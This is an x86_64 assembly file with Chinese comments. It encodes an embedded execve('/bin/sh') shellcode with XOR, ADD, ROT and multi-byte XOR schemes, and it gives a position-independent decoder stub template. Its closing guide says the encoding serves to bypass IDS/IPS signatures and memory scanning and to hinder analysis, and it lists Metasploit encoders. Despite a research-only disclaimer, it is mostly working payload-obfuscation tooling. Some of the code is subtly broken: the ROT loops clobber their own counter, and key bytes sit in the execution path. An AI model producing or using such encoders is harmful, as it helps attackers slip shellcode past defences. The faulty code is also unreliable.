; ============================================================
; custom_encoder.asm —— 自定义 Shellcode 编码器 (Linux x86_64)
;
; 包含多种编码方式：
;   1. XOR 编码
;   2. ADD/SUB 编码
;   3. ROT-N 编码
;   4. 插入编码（Polyglot 基础）
;
; 编译：nasm -f elf64 custom_encoder.asm -o custom_encoder.o
;
; 注意：本代码仅用于安全研究与学习目的
; ============================================================

section .data
    ; 原始 shellcode: execve("/bin/sh", NULL, NULL)
    ; 用于演示编码/解码
    original_shellcode  db  0x48, 0x31, 0xC0, 0x50, 0x48, 0xBB
                        db  0x2F, 0x2F, 0x62, 0x69, 0x6E, 0x2F
                        db  0x73, 0x68, 0x53, 0x48, 0x89, 0xE7
                        db  0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2
                        db  0xB0, 0x3B, 0x0F, 0x05
    original_len        equ $ - original_shellcode

    xor_key             db  0xAA       ; XOR 密钥
    add_key             db  0x11       ; ADD 密钥
    rot_n               db  3          ; ROT 移位位数

section .bss
    encoded_buf         resb    256
    decoded_buf         resb    256

section .text
    global _start

_start:
    ; ---------- 1. XOR 编码 ----------
    ; 原理：每个字节与密钥异或
    ; 解码：再次异或即可还原（XOR 的自反性）

    mov     rsi, original_shellcode
    mov     rdi, encoded_buf
    mov     rcx, original_len
    mov     bl, [xor_key]

xor_encode_loop:
    lodsb                               ; al = [rsi++]
    xor     al, bl                      ; 异或
    stosb                               ; [rdi++] = al
    loop    xor_encode_loop

    ; 解码（同样的操作）
    mov     rsi, encoded_buf
    mov     rdi, decoded_buf
    mov     rcx, original_len
    mov     bl, [xor_key]

xor_decode_loop:
    lodsb
    xor     al, bl
    stosb
    loop    xor_decode_loop

    ; decoded_buf 现在等于 original_shellcode

    ; ---------- 2. XOR 解码器（JMP-CALL-POP 风格，位置无关） ----------
    ; 这是实际 shellcode 中使用的解码器 stub
    ; 解码器 + 编码后的 shellcode 一起使用

    ; 解码器模板：
    ;   jmp short call_decoder
    ; decoder:
    ;   pop rsi                   ; 获取编码数据地址
    ;   xor rcx, rcx
    ;   mov cl, <长度>             ; 编码数据长度
    ; decode_loop:
    ;   xor byte [rsi + rcx - 1], <密钥>
    ;   loop decode_loop
    ;   jmp short encoded_data_end ; 跳转到解码后的 shellcode
    ; call_decoder:
    ;   call decoder
    ;   <编码后的 shellcode 数据>
    ; encoded_data_end:

    ; ---------- 3. ADD 编码 ----------
    ; 原理：每个字节加上密钥
    ; 解码：每个字节减去密钥

    mov     rsi, original_shellcode
    mov     rdi, encoded_buf
    mov     rcx, original_len
    mov     bl, [add_key]

add_encode_loop:
    lodsb
    add     al, bl                      ; 加法编码
    stosb
    loop    add_encode_loop

    ; 解码
    mov     rsi, encoded_buf
    mov     rdi, decoded_buf
    mov     rcx, original_len
    mov     bl, [add_key]

add_decode_loop:
    lodsb
    sub     al, bl                      ; 减法解码
    stosb
    loop    add_decode_loop

    ; ---------- 4. ADD 解码器（位置无关） ----------
    ; 与 XOR 解码器类似，用 sub 替换 xor

    ; ---------- 5. ROT-N 编码 ----------
    ; 原理：循环移位（类似凯撒密码）
    ; ROT-13 是 ROT-N 的特例

    mov     rsi, original_shellcode
    mov     rdi, encoded_buf
    mov     rcx, original_len
    mov     bl, [rot_n]

rot_encode_loop:
    lodsb
    mov     dl, al
    mov     cl, bl
    rol     al, cl                      ; 循环左移 N 位
    stosb
    loop    rot_encode_loop

    ; 解码：循环右移 N 位
    mov     rsi, encoded_buf
    mov     rdi, decoded_buf
    mov     rcx, original_len
    mov     bl, [rot_n]

rot_decode_loop:
    lodsb
    mov     cl, bl
    ror     al, cl                      ; 循环右移 N 位
    stosb
    loop    rot_decode_loop

    ; ---------- 6. 多字节 XOR 密钥编码 ----------
    ; 使用更长的密钥，提高解码难度
    ; 密钥循环使用

    mov     rsi, original_shellcode
    mov     rdi, encoded_buf
    mov     rcx, original_len
    xor     rdx, rdx                    ; 密钥索引

multi_key_data:
    ; 多字节密钥示例: 0xAA, 0xBB, 0xCC, 0xDD
    db      0xAA, 0xBB, 0xCC, 0xDD

multi_xor_encode_loop:
    lodsb
    mov     bl, [multi_key_data + rdx]
    xor     al, bl
    stosb
    inc     rdx
    and     rdx, 3                      ; rdx = rdx % 4
    loop    multi_xor_encode_loop

    ; ---------- 退出 ----------
    mov     rax, 60
    mov     rdi, 0
    syscall

; ============================================================
; 编码器使用指南：
;
; 1. 为什么需要编码 Shellcode？
;    - 避免坏字符（bad chars）：如 \x00, \x0a, \x0d 等
;    - 绕过 IDS/IPS 特征检测
;    - 绕过内存扫描检测
;    - 增加逆向分析难度
;
; 2. 坏字符检测方法
;    - 手动检查 shellcode 字节
;    - 使用 msfvenom --bad-chars
;    - 逐字节测试确认坏字符
;
; 3. 编码器选择
;    - XOR 编码：最简单，自反性，解码速度快
;    - ADD/SUB：稍复杂，需要减法解码
;    - ROT-N：循环移位，字节集不变
;    - 多字节密钥：抗频率分析
;    - 字母数字编码：输出全为可打印字符
;
; 4. 解码器大小考虑
;    - 解码器本身也是 shellcode 的一部分
;    - 编码后总大小 = 解码器大小 + 编码数据大小
;    - 要确保总大小不超过缓冲区
;
; 5. 编码步骤
;    a. 确定坏字符列表
;    b. 选择合适的编码方式和密钥
;    c. 对 shellcode 进行编码
;    d. 验证编码结果不含坏字符
;    e. 组合解码器 + 编码数据
;    f. 测试完整 shellcode
;
; 6. Metasploit 编码器参考
;    x86/shikata_ga_nai  - 多边形 XOR 编码（最常用）
;    x86/alpha_mixed     - 字母数字混合编码
;    x86/alpha_upper     - 全大写字母编码
;    x86/countdown       - 倒计时 XOR 编码
;    x86/fnstenv_mov     - FPU 指令获取 EIP
;    x86/jmp_call_additive - JMP-CALL-POP 风格
;
; 7. 自定义编码器开发要点
;    - 解码器必须是位置无关代码（PIC）
;    - 解码器不能包含坏字符
;    - 解码后跳转到正确位置
;    - 考虑大小优化
;    - 测试解码正确性
; ============================================================
